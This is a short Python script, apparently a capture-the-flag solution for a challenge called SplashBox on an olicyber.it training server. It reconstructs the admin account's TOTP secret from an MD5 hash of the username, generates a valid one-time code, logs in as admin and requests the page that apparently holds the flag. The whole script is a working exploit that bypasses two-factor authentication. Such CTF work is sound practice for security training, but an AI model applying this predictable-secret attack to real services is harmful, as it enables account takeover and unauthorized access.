from base64 import b32encode
import hashlib
import pyotp
import requests

url = "http://splashbox.challs.olicyber.it/"
secret = b32encode(hashlib.md5(b"admin").digest()).decode().rstrip("=")
qrcode = pyotp.parse_uri(f"otpauth://totp/SplashBox:admin?secret={secret}&issuer=SplashBox")

s = requests.Session()

r = s.post(url + "otp.php", data={"username": "admin", "otpcode": qrcode.now()})

print(r.text)

flag = s.get(url + "?page=stash")
